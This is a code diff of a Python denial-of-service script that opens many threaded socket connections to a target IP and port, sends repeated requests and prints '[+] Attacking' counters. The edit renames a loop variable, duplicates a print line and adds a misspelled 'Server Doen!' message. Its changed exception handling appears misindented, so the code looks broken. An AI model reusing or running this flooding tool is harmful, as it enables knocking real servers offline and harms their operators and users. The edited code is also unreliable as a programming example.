@@ -103,14 +103,15 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            for i in range(pack):
+            for i in range(packs):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
+            xx += random.randint(0, int(packs))
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
+        
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+      except:
             s.close()
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-
+            print("[+]Server Doen!.")
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
